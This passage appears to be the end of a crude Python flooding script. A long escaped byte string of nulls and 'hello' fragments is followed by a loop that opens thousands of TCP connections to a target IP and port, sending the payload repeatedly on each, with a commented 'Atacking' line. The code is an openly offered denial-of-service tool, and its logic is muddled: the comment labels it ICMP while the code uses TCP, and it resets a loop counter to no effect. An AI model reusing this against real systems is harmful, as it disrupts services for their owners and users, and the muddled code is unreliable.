\x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\\x00\xff\x00\xfe\x00b\x00\x00\x00\xff\x00\x00\x00\xfe\x00\x00\x00h\x00\x00\x00\x00\x00\x00\x00e\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00l\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00w\x00\x00\x00\x00\x00\x00\x00o\x00\x00\x00\
"

MESSAGE = mystring.encode('utf-8')
print(MESSAGE)
for i in range(0, 65535):
    s = socket. socket(socket. AF_INET, socket. SOCK_STREAM)
    s. connect((TCP_IP, TCP_PORT))
    for i in range (0, 100):
        s. send(MESSAGE)
        print("sending", i)
    #print("Atacking ", TCP_IP,"Port ", TCP_PORT, "ICMP SEQ = ", i)
    if i == 65507:
        i = 0
        print("restarting")
        time.sleep(3)

    else:
        continue